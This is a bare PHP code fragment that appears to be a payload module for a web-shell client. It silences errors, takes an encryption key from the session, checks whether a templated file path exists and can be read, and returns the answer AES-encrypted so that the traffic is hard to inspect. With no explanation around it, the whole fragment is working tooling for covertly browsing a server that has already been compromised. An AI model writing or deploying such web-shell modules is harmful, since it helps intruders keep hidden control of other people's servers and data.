
error_reporting(0);
$key = $_SESSION['key'];
session_write_close();
$path = base64_decode('__PATH__');
$data = array(
    "path" => $path,
    "status" => is_readable($path)
);
if ($data["status"]) {
    $data["type"] = is_dir($path) ? "dir" : "file";
}

echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $key);
